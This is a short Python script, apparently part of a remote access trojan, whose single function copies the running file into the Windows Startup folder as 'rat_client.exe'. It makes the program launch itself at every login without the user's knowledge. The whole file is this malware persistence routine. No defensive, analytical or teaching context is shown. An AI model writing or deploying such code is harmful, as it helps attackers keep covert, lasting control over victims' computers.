import os
import sys
import shutil

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_name = sys.argv[0]
    shutil.copy(script_name, os.path.join(startup_path, 'rat_client.exe'))  # Copy to startup folder

if __name__ == "__main__":
    add_to_startup()
